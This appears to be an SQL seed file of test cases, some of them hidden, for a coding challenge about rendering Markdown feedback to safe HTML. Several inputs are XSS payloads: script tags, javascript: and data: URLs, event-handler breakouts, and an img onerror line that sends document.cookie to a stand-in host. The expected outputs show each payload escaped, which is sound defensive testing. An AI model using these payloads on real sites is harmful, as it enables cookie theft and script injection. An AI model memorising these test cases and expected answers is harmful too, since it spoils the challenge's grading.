INSERT INTO challenge.challenge_test_cases (challenge_id, name, input_data, expected_output, score, is_sample, is_hidden, sort_order)
VALUES ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'Paragraph with bold, inline code and a bullet list', '["**Good start.** Your loop visits every lesson once.\n\nThe bug is in `lessonCount`:\n- it starts at 1 instead of 0\n- it is never reset between courses"]', '"=== feedback 1 ===\n<p><strong>Good start.</strong> Your loop visits every lesson once.</p>\n<p>The bug is in <code>lessonCount</code>:</p>\n<ul><li>it starts at 1 instead of 0</li><li>it is never reset between courses</li></ul>"', 3, true, false, 1),
       ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'Numbered steps, a fenced code block and an https link', '["Try this:\n1. Run the failing test locally\n2. Print the value of `total` before the return\n\n```ts\nlet total = 0\nfor (const lesson of lessons) total += lesson.minutes\n```\nRead more in the [array guide](https://docs.codedev.test/arrays).","Well done. **All tests pass.**"]', '"=== feedback 1 ===\n<p>Try this:</p>\n<ol><li>Run the failing test locally</li><li>Print the value of <code>total</code> before the return</li></ol>\n<pre><code>let total = 0\nfor (const lesson of lessons) total += lesson.minutes</code></pre>\n<p>Read more in the <a href=\"https://docs.codedev.test/arrays\" rel=\"noopener noreferrer\">array guide</a>.</p>\n=== feedback 2 ===\n<p>Well done. <strong>All tests pass.</strong></p>"', 3, true, false, 2),
       ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'HTML tags and event handlers in the model output are shown as text', '["Nice work! <img src=x onerror=\"fetch(''https://evil.test/c?''+document.cookie)\">","<script>alert(1)</script> Check the loop bounds.","- see <a href=\"javascript:alert(1)\">the docs</a>\n- **<svg onload=alert(1)>**"]', '"=== feedback 1 ===\n<p>Nice work! &lt;img src=x onerror=&quot;fetch(&#39;https://evil.test/c?&#39;+document.cookie)&quot;&gt;</p>\n=== feedback 2 ===\n<p>&lt;script&gt;alert(1)&lt;/script&gt; Check the loop bounds.</p>\n=== feedback 3 ===\n<ul><li>see &lt;a href=&quot;javascript:alert(1)&quot;&gt;the docs&lt;/a&gt;</li><li><strong>&lt;svg onload=alert(1)&gt;</strong></li></ul>"', 3, false, true, 3),
       ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'Only http and https links become anchors; URLs are escaped', '["[docs](javascript:alert(document.cookie)) and [docs](JaVaScRiPt:alert(1))","[guide](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) or [x](vbscript:msgbox(1))","![pic](https://img.codedev.test/a.png) and [report](https://api.codedev.test/r?id=1&sort=desc)","[click](https://ok.test/\"onmouseover=\"alert(1)) and [mail](mailto:support@codedev.test) and [up](HTTPS://app.codedev.test/x)"]', '"=== feedback 1 ===\n<p>docs) and docs)</p>\n=== feedback 2 ===\n<p>guide or x)</p>\n=== feedback 3 ===\n<p>!<a href=\"https://img.codedev.test/a.png\" rel=\"noopener noreferrer\">pic</a> and <a href=\"https://api.codedev.test/r?id=1&amp;sort=desc\" rel=\"noopener noreferrer\">report</a></p>\n=== feedback 4 ===\n<p><a href=\"https://ok.test/&quot;onmouseover=&quot;alert(1\" rel=\"noopener noreferrer\">click</a>) and mail and <a href=\"HTTPS://app.codedev.test/x\" rel=\"noopener noreferrer\">up</a></p>"', 3, false, true, 4),
       ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'Code spans and code blocks are escaped and spans do not nest', '["Use `i <= n` and `a && b` in the condition.","```js\nif (a < b && c > d) {\n  return \"</code></pre><img src=x onerror=alert(1)>\";\n}\n```","Use `a ** b` for powers and **check** the base.","`**not bold**` and **`not code`**"]', '"=== feedback 1 ===\n<p>Use <code>i &lt;= n</code> and <code>a &amp;&amp; b</code> in the condition.</p>\n=== feedback 2 ===\n<pre><code>if (a &lt; b &amp;&amp; c &gt; d) {\n  return &quot;&lt;/code&gt;&lt;/pre&gt;&lt;img src=x onerror=alert(1)&gt;&quot;;\n}</code></pre>\n=== feedback 3 ===\n<p>Use <code>a ** b</code> for powers and <strong>check</strong> the base.</p>\n=== feedback 4 ===\n<p><code>**not bold**</code> and <strong>`not code`</strong></p>"', 3, false, true, 5),
       ((SELECT id FROM challenge.challenges WHERE public_id = 'chal_coding_lle_412'), 'Entities, quotes and apostrophes are escaped again', '["The test expects &lt;b&gt; and gets &amp;.","Don''t use \"==\" here; it''s ''loose''.","[a \"quoted\" link](https://docs.codedev.test/eq) and **5 > 3 & 2 < 4**"]', '"=== feedback 1 ===\n<p>The test expects &amp;lt;b&amp;gt; and gets &amp;amp;.</p>\n=== feedback 2 ===\n<p>Don&#39;t use &quot;==&quot; here; it&#39;s &#39;loose&#39;.</p>\n=== feedback 3 ===\n<p><a href=\"https://docs.codedev.test/eq\" rel=\"noopener noreferrer\">a &quot;quoted&quot; link</a> and <strong>5 &gt; 3 &amp; 2 &lt; 4</strong></p>"', 3, false, true, 6),
